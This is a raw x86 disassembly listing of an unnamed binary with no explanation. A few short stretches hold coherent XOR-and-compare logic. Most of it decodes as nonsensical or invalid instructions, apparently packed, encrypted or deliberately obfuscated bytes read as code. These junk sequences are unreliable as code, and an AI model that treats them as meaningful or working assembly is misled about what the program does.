  40765f:	mov    eax,DWORD PTR [ebp-0x4]
  407662:	mov    eax,DWORD PTR [ebp-0x28]
  407665:	mov    eax,DWORD PTR [eax+0xc]
  407668:	mov    edx,DWORD PTR [ebp-0x4]
  40766b:	movzx  eax,WORD PTR [edx+eax*1]
  40766f:	cdq    
  407670:	shld   edx,eax,0x2
  407674:	xor    edx,ecx
  407676:	mov    DWORD PTR [ebp+0xc],edx
  407679:	jmp    0x407a1a
  40767e:	sbb    BYTE PTR [edi-0x2f],cl
  407681:	pop    esi
  407682:	call   0x3e77:0x3eb7bc64
  407689:	fld    QWORD PTR [ebx-0x4161e134]
  40768f:	push   edi
  407690:	mov    esi,0xbec4bdbe
  407695:	mov    esi,0x8b4ac1ff
  40769a:	mov    ebp,0x2b216b00
  40769f:	ret    0x2002
  4076a2:	jp     0x407721
  4076a4:	ds mov dh,0x99
  4076a7:	pop    ds
  4076a8:	rcr    DWORD PTR [ecx+ecx*1-0x50da69dc],0xa8
  4076b0:	sti    
  4076b1:	add    DWORD PTR [ebx],ecx
  4076b3:	mov    edx,gs
  4076b5:	js     0x4076be
  4076b7:	mov    ds:0x941d1c3b,al
  4076bc:	imul   ecx,DWORD PTR [ebx-0x4bb0e8e4],0x3e413ec1
  4076c6:	sbb    edx,DWORD PTR [ebx+edi*4+0x53]
  4076ca:	inc    esi
  4076cb:	and    eax,0xd2a618
  4076d0:	xchg   ebp,eax
  4076d1:	lea    ebp,[edx]
  4076d3:	cld    
  4076d4:	xchg   esp,eax
  4076d5:	mov    esp,0xb464d52d
  4076da:	ret    
  4076db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076dc:	outs   dx,BYTE PTR ds:[esi]
  4076dd:	sub    eax,0x53b04bbb
  4076e2:	es hlt 
  4076e4:	jl     0x4076ca
  4076e6:	xchg   edi,eax
  4076e7:	inc    ecx
  4076e8:	loope  0x40771b
  4076ea:	xlat   BYTE PTR ds:[ebx]
  4076eb:	sub    esp,DWORD PTR [edi+0x47]
  4076ee:	dec    edx
  4076ef:	pop    ebp
  4076f0:	ins    DWORD PTR es:[edi],dx
  4076f1:	jge    0x4076e2
  4076f3:	mov    ch,0xc8
  4076f5:	xor    eax,0x8478b22d
  4076fa:	xor    eax,0x9b1d64fe
  4076ff:	xor    eax,eax
  407701:	pop    DWORD PTR [edx+0x7e]
  407704:	xchg   edi,eax
  407705:	inc    edi
  407706:	test   al,0xe
  407708:	and    al,0x69
  40770a:	cwde   
  40770b:	adc    dl,BYTE PTR gs:[esi+0x65]
  40770f:	mov    ss,WORD PTR [ecx+eiz*8-0x3e]
  407713:	out    0x1a,eax
  407715:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407716:	fwait
  407717:	push   edi
  407718:	imul   ebp,ecx,0x3a000b43
  40771e:	(bad)  
  40771f:	adc    eax,0x4d9cf771
  407724:	icebp  
  407725:	out    0x51,al
  407727:	repz in al,0x31
  40772a:	retf   
  40772b:	and    eax,0x502e7c03
  407730:	test   eax,0x217ededc
  407735:	push   0xffffffb4
  407737:	or     eax,0xf040930d
  40773c:	in     eax,dx
  40773d:	shl    DWORD PTR [eax-0x2de6dddb],1
  407743:	push   0x5
  407745:	les    esp,FWORD PTR [edi+edi*8+0x76]
  407749:	sar    DWORD PTR [esi+0x3d],cl
  40774c:	into   
  40774d:	jnp    0x407763
  40774f:	retf   
  407750:	xlat   BYTE PTR ds:[ebx]
  407751:	mov    dh,0x22
  407753:	xor    ebp,0x7739ba81
  407759:	mov    ds:0x7e81f44b,al
  40775e:	pop    esi
  40775f:	cdq    
  407760:	enter  0xd3f3,0xf1
  407764:	dec    ecx
  407765:	fwait
  407766:	aam    0xe7
  407768:	and    eax,0x22309a3d
  40776d:	inc    BYTE PTR [edx]
  40776f:	xchg   BYTE PTR [edi+0x34],cl
  407772:	in     al,0x7e
  407774:	or     DWORD PTR ds:0xca4a3fda,ebx
  40777a:	(bad)  
  40777b:	mov    BYTE PTR [edx+edi*4],dl
  40777e:	xor    eax,DWORD PTR [ebx]
  407780:	es gs xor bh,dl
  407784:	mov    ?,WORD PTR [edi-0x79]
  407787:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407788:	sbb    bl,BYTE PTR [ecx+0x11]
  40778b:	fs pop ebp
  40778d:	fsubrp st(4),st
  40778f:	xchg   BYTE PTR [eax],dh
  407791:	adc    edx,ecx
  407793:	inc    esp
  407794:	pop    ebx
  407795:	bt     DWORD PTR [edi+0x6a7152c8],esi
  40779c:	stos   DWORD PTR es:[edi],eax
  40779d:	and    al,0xc9
  40779f:	ins    BYTE PTR es:[edi],dx
  4077a0:	adc    DWORD PTR [ecx+ecx*4],edi
  4077a3:	pop    ebx
  4077a4:	data16 mov dl,0xc0
  4077a7:	dec    BYTE PTR [ebp+0x270893c3]
  4077ad:	or     DWORD PTR [edi+0x27688f35],ecx
  4077b3:	dec    ebp
  4077b4:	xor    al,BYTE PTR [ecx]
  4077b6:	xchg   ecx,eax
  4077b7:	xchg   ecx,eax
  4077b8:	test   eax,0x8dbe00c7
  4077bd:	and    eax,0x53c6c173
  4077c2:	xlat   BYTE PTR ds:[ebx]
  4077c3:	fisttp QWORD PTR ds:0x2dbca83a
  4077c9:	jns    0x4077f9
  4077cb:	inc    esi
  4077cc:	mov    fs:0x8b3b9fcd,eax
  4077d2:	mov    ds:0xa0bd3c56,al
  4077d7:	(bad)  
  4077d9:	sti    
  4077da:	ret    
  4077db:	int3   
  4077dc:	xchg   ecx,eax
  4077dd:	adc    eax,0xfc862fbf
  4077e2:	push   esi
  4077e3:	shr    dh,1
  4077e5:	jge    0x407807
  4077e7:	or     DWORD PTR [ecx-0xe],ebx
  4077ea:	mov    DWORD PTR [esi],ebx
  4077ec:	sbb    esi,DWORD PTR ds:0xcd594196
  4077f2:	mov    eax,0x6ebeaaba
  4077f7:	sub    al,0x41
  4077f9:	mov    DWORD PTR [ecx+0x25],esi
  4077fc:	lahf   
  4077fd:	xor    edx,DWORD PTR [edx+0x7]
  407800:	int3   
  407801:	mov    eax,ds:0x6624225b
  407806:	mov    al,0x95
  407808:	lds    ebx,FWORD PTR [esi-0x79]
  40780b:	mov    edi,fs
  40780d:	pop    edx
  40780e:	iret   
  40780f:	call   0xd1d5:0x2cd404e5
  407816:	imul   DWORD PTR [eax-0x41]
  407819:	pusha  
  40781a:	bnd ret 0xb8c2
  40781e:	jae    0x4077a1
  407820:	into   
  407821:	xchg   ebx,eax
  407822:	jecxz  0x40788b
  407824:	mov    ds:0x282c7646,al
  407829:	pushf  
  40782a:	xchg   ebp,eax
  40782b:	out    dx,eax
  40782c:	jae    0x4077b9
  40782e:	adc    al,0x82
  407830:	dec    edx
  407831:	mov    ch,0xe8
  407833:	jmp    0xbd560d47
  407838:	rcr    DWORD PTR [edx+0x2aa28028],cl
  40783e:	sbb    bl,BYTE PTR [eax-0x29d0ff01]
  407844:	test   al,0xaf
  407846:	das    
  407847:	adc    ebx,DWORD PTR [ecx]
  407849:	pop    eax
  40784a:	pop    edx
  40784b:	retf   0x4363
  40784e:	mov    bl,0x1
  407850:	dec    edi
  407851:	xchg   esp,eax
  407852:	loope  0x407899
  407854:	int    0xb8
  407856:	mov    dh,0x1
  407858:	or     DWORD PTR [ebp-0x52],ebx
  40785b:	retf   0x6606
  40785e:	lock xchg DWORD PTR [ecx],ebx
  407861:	out    0x16,al
  407863:	inc    edx
  407864:	push   0xc15f28db
  407869:	push   0xfffffffa
  40786b:	sbb    eax,0x9c3613b1
  407870:	mov    bl,0x96
  407872:	jb     0x4077f8
  407874:	mov    esi,0x60a387b7
  407879:	or     edx,DWORD PTR [ebp-0x62]
  40787c:	xlat   BYTE PTR ds:[ebx]
  40787d:	dec    eax
  40787e:	sar    BYTE PTR [edx+edi*1+0x5f],cl
  407882:	loopne 0x4078a4
  407884:	mov    ds,WORD PTR [eax+edi*2]
  407887:	push   eax
  407888:	mov    esi,ds
  40788a:	ror    DWORD PTR [ebx-0x14],1
  40788d:	pushf  
  40788e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40788f:	jb     0x407861
  407891:	(bad)  
  407892:	jl     0x4078cd
  407894:	xchg   ecx,eax
  407895:	mov    edx,0xf27efb35
  40789a:	cmp    dh,BYTE PTR [edx]
  40789c:	aas    
  40789d:	je     0x4078f2
  40789f:	push   ecx
  4078a0:	call   0x2ae3:0x1cc286f6
  4078a7:	mov    edi,0x4ad736f5
  4078ac:	clc    
  4078ad:	or     ah,bl
  4078af:	popf   
  4078b0:	idiv   BYTE PTR [eax]
  4078b2:	and    dl,ch
  4078b4:	jo     0x40792b
  4078b6:	pop    esi
  4078b7:	pop    es
  4078b8:	cdq    
  4078b9:	mov    eax,0x370f574f
  4078be:	inc    ecx
  4078bf:	je     0x407915
  4078c1:	cs pop eax
  4078c3:	sbb    dl,dh
  4078c5:	repz cmc 
  4078c7:	popa   
  4078c8:	imul   edi,edx,0xffffffdd
  4078cb:	push   ds
  4078cc:	iret   
  4078cd:	addr16 js 0x407921
  4078d0:	mov    ecx,0x18997ff8
  4078d5:	in     eax,0xb3
  4078d7:	out    0x9,eax
  4078d9:	and    esi,DWORD PTR [edi+0x13]
  4078dc:	std    
  4078dd:	push   eax
  4078de:	mov    bl,0x9d
  4078e0:	jnp    0x407873
  4078e2:	loope  0x407931
  4078e4:	leave  
  4078e5:	cdq    
  4078e6:	mov    ds:0xde81e05,al
  4078eb:	add    DWORD PTR [ebx],0xffffff9f
  4078ee:	push   ebp
  4078ef:	mov    BYTE PTR [edi+0x2],dh
  4078f2:	mov    ah,0x71
  4078f4:	fwait
  4078f5:	add    esp,DWORD PTR [ecx+0x7a]
  4078f8:	mov    eax,DWORD PTR [eax-0x575b7ff6]
  4078fe:	and    ah,ch
  407900:	inc    ebx
  407901:	loopne 0x407903
  407903:	push   edx
  407904:	xor    DWORD PTR [ebx-0xe],0x8f43fdc7
  40790b:	xor    DWORD PTR [ebx],ebp
  40790d:	hlt    
  40790e:	test   BYTE PTR [ebx],0xf0
  407911:	test   eax,0x6b9bbf9d
  407916:	lahf   
  407917:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407918:	and    bh,dl
  40791a:	int3   
  40791b:	sar    DWORD PTR [edi-0x54a3fd4f],cl
  407921:	mov    al,0xa4
  407923:	in     eax,dx
  407924:	inc    ecx
  407925:	pop    eax
  407926:	inc    ebx
  407927:	faddp  st(1),st
  407929:	inc    edi
  40792a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40792b:	sbb    BYTE PTR [edx],ch
  40792d:	xchg   ebp,eax
  40792e:	aad    0x47
  407930:	mov    ebx,0xb08eccc2
  407935:	aam    0x47
  407937:	call   FWORD PTR ds:0x4f1cb075
  40793d:	test   al,0xf
  40793f:	pop    esi
  407940:	icebp  
  407941:	dec    eax
  407942:	mov    ds:0x9412b1c6,al
  407947:	aas    
  407948:	add    eax,ecx
  40794a:	mov    bl,ah
  40794c:	jg     0x4078ef
  40794e:	mov    bh,0x97
  407950:	bound  ecx,QWORD PTR [eax+0x675a8723]
  407956:	(bad)  
  407957:	sub    BYTE PTR [esi-0x655dc601],0x6e
  40795e:	mov    ebp,0x31c3c9a2
  407963:	push   eax
  407964:	jmp    0xe66e65ff
  407969:	(bad)  
  40796a:	lds    edx,FWORD PTR [esi-0x74]
  40796d:	add    DWORD PTR [esi-0x126f827e],edx
  407973:	inc    ebp
  407974:	sub    DWORD PTR [eax+0x5f],esi
  407977:	pop    edx
  407978:	mov    ah,0x5b
  40797a:	icebp  
  40797b:	inc    esp
  40797c:	dec    ebx
  40797d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40797e:	rol    BYTE PTR es:[edi+0x56],cl
  407982:	or     bl,BYTE PTR [edx-0x54]
  407985:	inc    BYTE PTR [edx+0x6]
  407988:	(bad)  
  407989:	fidiv  DWORD PTR [esi]
  40798b:	imul   edx,ecx,0xffffffce
  40798e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40798f:	clc    
  407990:	stos   BYTE PTR es:[edi],al
  407991:	pop    eax
  407992:	pop    ebp
  407993:	pop    ss
  407994:	or     ebx,DWORD PTR [ebp-0xc]
  407997:	bts    DWORD PTR [esi-0x6c],ebp
  40799b:	xchg   ebx,eax
  40799c:	jno    0x40793d
  40799e:	push   esp
  40799f:	int    0xd6
  4079a1:	xchg   DWORD PTR [ecx],eax
  4079a3:	xor    eax,0x6a088e7e
  4079a8:	call   0x41a7ff44
  4079ad:	inc    ebp
  4079ae:	sbb    ebp,DWORD PTR [edi+0x21]
  4079b1:	cmp    al,BYTE PTR [esi+0x35]
  4079b4:	enter  0xe6cb,0xc
  4079b8:	push   cs
  4079b9:	xor    DWORD PTR [esi+0xa],ebp
  4079bc:	test   BYTE PTR [ebp-0x6c503f3],bh
  4079c2:	(bad)  
  4079c3:	cli    
  4079c4:	scas   eax,DWORD PTR es:[edi]
  4079c5:	push   es
  4079c6:	jne    0x4079fc
  4079c8:	sbb    BYTE PTR [ebp-0x44],dl
  4079cb:	sbb    al,0x48
  4079cd:	ret    0x80f6
  4079d0:	jnp    0x4079a8
  4079d2:	pop    ds
  4079d3:	cmp    eax,0x71d94e3c
  4079d8:	push   0x2aeaf38b
  4079dd:	xor    ch,BYTE PTR [edx-0x7b]
  4079e0:	pop    ss
  4079e1:	imul   eax,DWORD PTR [edx+esi*1-0x12],0x4e254203
  4079e9:	sbb    DWORD PTR [ecx+eiz*2+0x66],esp
  4079ed:	inc    edx
  4079ee:	ficom  WORD PTR [ecx-0x785295a7]
  4079f4:	(bad)  
  4079f6:	ficom  WORD PTR [edi-0x1603ec86]
  4079fc:	and    BYTE PTR [ebp-0x5be7f368],0x3b
  407a03:	xchg   esi,eax
  407a04:	mov    edx,eax
  407a06:	sbb    dh,ch
  407a08:	xor    al,0x81
  407a0a:	int    0x8e
  407a0c:	or     DWORD PTR [edx-0x5358777e],0x8ae4c85c
  407a16:	adc    BYTE PTR cs:[ecx-0x57aa74da],bl
  407a1d:	shl    eax,0x2
  407a20:	mov    DWORD PTR [ebp+0x10],edx
  407a23:	mov    edx,DWORD PTR [ebp-0x54]
  407a26:	xor    eax,0xcb79b576
  407a2b:	mov    DWORD PTR [ebp+0x14],edx
  407a2e:	cmp    eax,DWORD PTR [ebp+0x10]
  407a31:	jne    0x408352
  407a37:	mov    eax,edx
  407a39:	cmp    DWORD PTR [ebp+0xc],eax
  407a3c:	jne    0x408352
  407a42:	mov    DWORD PTR [ebp+0x8],0xcb79b576
  407a49:	mov    DWORD PTR [ebp+0xc],ecx
  407a4c:	mov    DWORD PTR [ebp-0x60],0xcb79b572
  407a53:	mov    DWORD PTR [ebp-0x5c],ecx
  407a56:	mov    DWORD PTR [ebp-0x48],0xcb79b57e
  407a5d:	mov    DWORD PTR [ebp-0x44],ecx
  407a60:	mov    DWORD PTR [ebp-0x38],0xcb79b57a
  407a67:	mov    DWORD PTR [ebp-0x34],ecx
  407a6a:	mov    eax,DWORD PTR [ebp+0x8]
  407a6d:	jmp    0x407e0e
  407a72:	cmp    eax,0x2444c2a4
  407a77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a78:	inc    eax
  407a79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a7a:	ret    0x7a7b
  407a7d:	xchg   edx,eax
  407a7e:	or     al,0x53
  407a80:	dec    edx
  407a81:	xchg   edx,eax
  407a82:	mov    ebp,0xbdbebe5d
  407a87:	les    edi,FWORD PTR [esi-0x4dfe042]
  407a8d:	ficomp DWORD PTR [ebp+eiz*8+0x616ebb65]
  407a94:	xchg   DWORD PTR [edx],esp
  407a96:	inc    edi
  407a97:	(bad)  
  407a99:	pop    es
  407a9a:	in     eax,0x53
  407a9c:	mov    ebx,0x7d03689
  407aa1:	jmp    0xd8ce:0x654cbff0
  407aa8:	imul   ebp,DWORD PTR [eax-0x3d7c06aa],0x52b414d7
  407ab2:	add    esi,DWORD PTR [eax-0x30b5fc5b]
  407ab8:	mov    dh,0xbe
  407aba:	xchg   ecx,eax
  407abb:	mov    eax,ds:0x41e77f31
  407ac0:	xor    esp,DWORD PTR [eax+0x2a]
  407ac3:	cs inc eax
  407ac5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ac6:	je     0x407a66
  407ac8:	scas   al,BYTE PTR es:[edi]
  407ac9:	mov    cl,cl
  407acb:	or     eax,0x7302c534
  407ad0:	icebp  
  407ad1:	jg     0x407a88
  407ad3:	test   DWORD PTR [esi-0x740fbb75],esi
  407ad9:	adc    DWORD PTR [eax+0x5edd8b27],ebp
  407adf:	adc    DWORD PTR [eax+0x33],eax
  407ae2:	sub    bh,BYTE PTR [esi+0x11653f16]
  407ae8:	bnd ret 
  407aea:	sti    
  407aeb:	mov    BYTE PTR [ebx],dh
  407aed:	fs in  al,0x63
  407af0:	inc    esi
  407af1:	push   ebp
  407af2:	imul   ebx,esi,0xffffffd1
  407af5:	adc    ebx,edi
  407af7:	iret   
  407af8:	lods   al,BYTE PTR ds:[esi]
  407af9:	mov    ebp,0x17e0a00d
  407afe:	jbe    0x407a8d
  407b00:	pop    edi
  407b01:	retf   
  407b02:	dec    esi
  407b03:	sub    bh,al
  407b05:	enter  0xc348,0x7c
  407b09:	sub    BYTE PTR [eax-0x5472ed10],cl
  407b0f:	xchg   ecx,eax
  407b10:	or     ebp,eax
  407b12:	scas   eax,DWORD PTR es:[edi]
  407b13:	pop    es
  407b14:	jne    0x407b7c
  407b16:	inc    ecx
  407b17:	inc    esp
  407b18:	jnp    0x407b15
  407b1a:	(bad)  
  407b1b:	(bad)  
  407b1d:	in     eax,0x97
  407b1f:	push   esp
  407b20:	ins    BYTE PTR es:[edi],dx
  407b21:	cmp    BYTE PTR [eax-0x7f2ca5d1],bh
  407b27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b28:	gs dec edi
  407b2a:	sbb    BYTE PTR [ecx+0x3e8d7059],bh
  407b30:	adc    ah,bh
  407b32:	xlat   BYTE PTR ds:[ebx]
  407b33:	push   edi
  407b34:	lock not DWORD PTR [edx]
  407b37:	not    DWORD PTR [ebx-0x7d0d948c]
  407b3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b3e:	call   0x9e48:0xe749b0e7
  407b45:	jmp    0x407bbf
  407b47:	rcl    BYTE PTR [ebx-0x6ff4332e],0xb0
  407b4e:	push   edx
  407b4f:	add    dl,BYTE PTR [ebp+eax*8+0xd]
  407b53:	xor    dl,BYTE PTR [ecx+edi*2]
  407b56:	sub    DWORD PTR gs:[esi+esi*4-0x6c],ebp
  407b5b:	dec    esp
  407b5c:	in     al,dx
  407b5d:	(bad)  
  407b5e:	jo     0x407b73
  407b60:	mov    dh,0xd3
  407b62:	outs   dx,DWORD PTR ds:[si]
  407b64:	stc    
  407b65:	sub    bh,BYTE PTR [ebx]
  407b67:	adc    BYTE PTR [ebx+0x6],al
  407b6a:	out    dx,eax
  407b6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b6c:	jns    0x407bed
  407b6e:	xor    eax,0x5798ca73
  407b73:	sar    dh,1
  407b75:	push   ds
  407b76:	leave  
  407b77:	fcom   QWORD PTR [bx-0x4a]
  407b7b:	dec    ebx
  407b7c:	push   ds
  407b7d:	in     al,0x57
  407b7f:	pop    esp
  407b80:	xchg   DWORD PTR [esi+edx*4],ebp
  407b83:	fdivr  DWORD PTR [ebp-0x63607216]
  407b89:	out    dx,eax
  407b8a:	icebp  
  407b8b:	xchg   edx,eax
  407b8c:	daa    
  407b8d:	div    DWORD PTR [esp+edx*4-0x1d]
  407b91:	sti    
  407b92:	sub    DWORD PTR [edx],ebx
  407b94:	gs daa 
  407b96:	mov    al,0xa3
  407b98:	les    esp,FWORD PTR ds:0xd98bcc65
  407b9e:	iret   
  407b9f:	dec    ecx
  407ba0:	push   edx
  407ba1:	mov    eax,ds
  407ba3:	retf   
  407ba4:	sub    BYTE PTR [eax+0xe041c20],dl
  407baa:	sbb    BYTE PTR [ebp+0x44],ch
  407bad:	add    BYTE PTR [edx+0x91737b4],0xfe
  407bb4:	xor    al,0xcc
  407bb6:	fmul   DWORD PTR [ebp-0x3a]
  407bb9:	fidiv  WORD PTR [ecx]
  407bbb:	test   eax,0xcff8f84b
  407bc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bc1:	inc    ebx
  407bc2:	mov    dl,0x74
  407bc4:	cmp    esi,DWORD PTR [edi+edx*2]
  407bc7:	cld    
  407bc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bc9:	xchg   edi,eax
  407bca:	lock or esi,DWORD PTR [edx+0x5c]
  407bce:	and    BYTE PTR [eax*2+0xe03bae6],dl
  407bd5:	mov    bh,BYTE PTR [eax]
  407bd7:	push   ebx
  407bd8:	(bad)  
  407bd9:	fcompp 
  407bdb:	inc    ebp
  407bdc:	imul   esp,DWORD PTR [esi],0x93f5b5a2
  407be2:	sbb    al,0x72
  407be4:	sar    BYTE PTR [edi],1
  407be6:	xor    BYTE PTR [ebx+0x1041cc],al
  407bec:	cmp    ah,BYTE PTR [edx+0x374599b7]
  407bf2:	rcr    DWORD PTR [esi],1
  407bf4:	gs inc ecx
  407bf6:	mov    esi,0x2fa89bbd
  407bfb:	test   eax,0xa2182261
  407c00:	push   ds
  407c01:	and    al,0x6e
  407c03:	or     al,0xaa
  407c05:	jmp    0x7daf:0xa40a6e64
  407c0c:	call   0x6c76e121
  407c11:	xchg   esp,eax
  407c12:	or     DWORD PTR gs:[ebp+eiz*8-0x5f],edi
  407c17:	and    esp,DWORD PTR ds:0xe6f30789
  407c1d:	mov    esi,0xc1559e6b
  407c22:	fwait
  407c23:	or     eax,0x3f82f092
  407c28:	inc    ebp
  407c29:	aam    0x23
  407c2b:	shr    DWORD PTR [eax-0x58],1
  407c2e:	in     al,0xcd
  407c30:	call   0x73d1:0x7819df09
  407c37:	push   ecx
  407c38:	push   0xffffffe6
  407c3a:	xchg   BYTE PTR [ebp-0x2f5805cd],ch
  407c40:	pop    ebp
  407c41:	add    DWORD PTR [edx+edx*1-0x79c29a45],edx
  407c48:	jge    0x407beb
  407c4a:	cmp    BYTE PTR [eax-0x2b],dl
  407c4d:	adc    edx,esi
  407c4f:	sti    
  407c50:	adc    DWORD PTR [eax],ebx
  407c52:	aad    0x77
  407c54:	cmp    ebp,DWORD PTR [ecx+0x39893256]
  407c5a:	jg     0x407c40
  407c5c:	sub    bh,BYTE PTR [edi*1+0x17ffa95f]
  407c63:	bound  esi,QWORD PTR [ebx]
  407c65:	out    dx,eax
  407c66:	cmp    eax,0xe5374d1
  407c6b:	js     0x407c48
  407c6d:	jns    0x407c1b
  407c6f:	retf   0xd2d9
  407c72:	jmp    0xa294:0x93c12836
  407c79:	inc    edi
  407c7a:	add    esi,esp
  407c7c:	outs   dx,BYTE PTR ds:[esi]
  407c7d:	(bad)  
  407c7e:	xchg   BYTE PTR [eiz*2+0x33435087],cl
  407c85:	or     dh,BYTE PTR [eax+0x7c]
  407c88:	mov    esp,DWORD PTR [eax+0x79014855]
  407c8e:	hlt    
  407c8f:	cs enter 0x9fb,0x87
  407c94:	mov    ds,edi
  407c96:	out    dx,eax
  407c97:	lea    edx,ds:0x9f3d6d8
  407c9d:	pop    es
  407c9e:	push   edi
  407c9f:	jl     0x407d0c
  407ca1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ca2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ca3:	and    al,BYTE PTR [edi+0x64]
  407ca6:	xchg   esi,eax
  407ca7:	sub    BYTE PTR [ebp+eax*4+0x79936171],ch
  407cae:	inc    ebp
  407caf:	jp     0x407d12
  407cb1:	ds xchg edi,eax
  407cb3:	pop    bx
  407cb5:	cmp    BYTE PTR [edi],dl
  407cb7:	mov    eax,ds:0x7aba94bd
  407cbc:	dec    edx
  407cbd:	push   ebp
  407cbe:	int3   
  407cbf:	fiadd  DWORD PTR ds:0x55a641c
  407cc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cc6:	repz inc edx
  407cc8:	ret    0x9019
  407ccb:	dec    ecx
  407ccc:	inc    esp
  407ccd:	repz fiadd WORD PTR [esi+0x45]
  407cd1:	add    edi,DWORD PTR [ebp+0x36]
  407cd4:	pop    esp
  407cd5:	dec    ebx
  407cd6:	mov    eax,ds:0xbf21df9a
  407cdb:	loop   0x407d40
  407cdd:	and    dh,bl
  407cdf:	test   DWORD PTR ds:0x8ad5aa61,ebx
  407ce5:	xchg   edx,eax
  407ce6:	aam    0xb6
  407ce8:	dec    edi
  407ce9:	sbb    cl,bl
  407ceb:	pop    ds
  407cec:	push   ebx
  407ced:	stos   BYTE PTR es:[edi],al
  407cee:	xchg   ebp,eax
  407cef:	fwait
  407cf0:	pop    ebx
  407cf1:	xchg   ebp,eax
  407cf2:	mov    ch,0x1e
  407cf4:	fld    TBYTE PTR [eax-0x17]
  407cf7:	je     0x407d28
  407cf9:	pop    ebp
  407cfa:	lahf   
  407cfb:	out    dx,al
  407cfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cfd:	sub    eax,0x5cf3cb8
  407d02:	ja     0x407d10
  407d04:	std    
  407d05:	push   edi
  407d06:	add    eax,0x357a6eb
  407d0b:	and    DWORD PTR [esi-0x69],eax
  407d0e:	and    DWORD PTR [ebx-0x1587413a],ebp
  407d14:	popf   
  407d15:	popf   
  407d16:	push   edx
  407d17:	add    ch,BYTE PTR [ecx+0x288204b3]
  407d1d:	mov    dl,0x27
  407d1f:	popa   
  407d20:	mov    ds:0x393443f1,eax
  407d25:	ret    
  407d26:	inc    ebp
  407d27:	imul   ebp,DWORD PTR [esi],0x78
  407d2a:	cmp    dl,bh
  407d2c:	mov    esp,0xc0e17910
  407d31:	aas    
  407d32:	adc    cl,dl
  407d34:	pusha  
  407d35:	cmp    eax,0x9fe734cf
  407d3a:	pusha  
  407d3b:	retf   
  407d3c:	dec    BYTE PTR [bp+0x59]
  407d40:	mov    edx,0xe02f09d7
  407d45:	xchg   ebp,eax
  407d46:	pusha  
  407d47:	pop    ds
  407d48:	loop   0x407db4
  407d4a:	push   es
  407d4b:	jo     0x407d02
  407d4d:	rcl    BYTE PTR [edi],cl
  407d4f:	ret    0xde0c
  407d52:	adc    al,BYTE PTR [edi+ecx*2]
  407d55:	loopne 0x407cff
  407d57:	cmp    ebx,DWORD PTR [ebx+0x2029d57a]
  407d5d:	popa   
  407d5e:	bound  esi,QWORD PTR [edx-0x57]
  407d61:	sub    bl,BYTE PTR [eax]
  407d63:	xlat   BYTE PTR ds:[ebx]
  407d64:	add    al,0x75
  407d66:	and    DWORD PTR [edi],ecx
  407d68:	sbb    al,0x65
  407d6a:	jle    0x407d35
  407d6c:	aaa    
  407d6d:	fcmovnb st,st(6)
  407d6f:	enter  0xbfe8,0xfe
  407d73:	stc    
  407d74:	mov    dl,0x35
  407d76:	arpl   WORD PTR [edi+0x5d],cx
  407d79:	shr    cl,cl
  407d7b:	iret   
  407d7c:	pushf  
  407d7d:	adc    eax,0x10a4c535
  407d82:	pop    ss
  407d83:	jnp    0x407daa
  407d85:	js     0x407dc1
  407d87:	push   ds
  407d88:	in     al,dx
  407d89:	or     eax,0x3ae7f3b2
  407d8e:	imul   ecx,edi,0x9e3f49ec
  407d94:	mov    eax,ds:0xc42e4f2b
  407d99:	dec    ebx
  407d9a:	stos   DWORD PTR es:[edi],eax
  407d9b:	xor    BYTE PTR [edi+0x60],0x84
  407d9f:	test   DWORD PTR [esi],ebp
  407da1:	ja     0x407d4e
  407da3:	lock inc edi
  407da5:	jbe    0x407d4d
  407da7:	pop    edi
  407da8:	dec    ecx
  407da9:	jg     0x407da4
  407dab:	dec    eax
  407dac:	dec    eax
  407dad:	jno    0x407d4a
  407daf:	dec    eax
  407db0:	out    0x2c,al
  407db2:	adc    cl,BYTE PTR [ebx+0x50]
  407db5:	rcl    DWORD PTR [edx+0x73],1
  407db8:	and    edx,DWORD PTR [ebp-0x5a]
  407dbb:	inc    esp
  407dbc:	fisttp DWORD PTR [eax+0x74830ccc]
  407dc2:	add    BYTE PTR [edx],ch
  407dc4:	mov    dl,0xf7
  407dc6:	and    eax,0xadbc172b
  407dcb:	scas   eax,DWORD PTR es:[edi]
  407dcc:	frstor [esi-0x70]
  407dcf:	adc    dh,ah
  407dd1:	add    edx,DWORD PTR [edx]
  407dd3:	fdiv   DWORD PTR [ebp+0x715d1810]
  407dd9:	push   edi
  407dda:	dec    ecx
  407ddb:	mov    DWORD PTR [esi-0x17],ebx
  407dde:	mov    ds:0xd97addd4,al
  407de3:	in     al,dx
  407de4:	sbb    al,0xc7
  407de6:	dec    ecx
  407de7:	dec    ecx
  407de8:	std    
  407de9:	test   ebx,edx
  407deb:	dec    edx
  407dec:	mov    bh,0xd9
  407dee:	lahf   
  407def:	add    ah,ch
  407df1:	leave  
  407df2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407df3:	jns    0x407de0
  407df5:	push   esp
  407df6:	push   cs
  407df7:	and    ch,dl
  407df9:	adc    eax,0x18542dc9
  407dfe:	xor    eax,0x5b81d4d6
  407e03:	int3   
  407e04:	xchg   ecx,eax
  407e05:	add    bh,0x7e
  407e08:	and    al,0x9b
  407e0a:	je     0x407dc3
  407e0c:	jnp    0x407e6f
  407e0e:	mov    ecx,DWORD PTR [ebp+0xc]
  407e11:	shrd   eax,ecx,0x2
  407e15:	shr    ecx,0x2
  407e18:	mov    ecx,DWORD PTR [ebp+0x8]
  407e1b:	mov    edx,DWORD PTR [ebp+0xc]
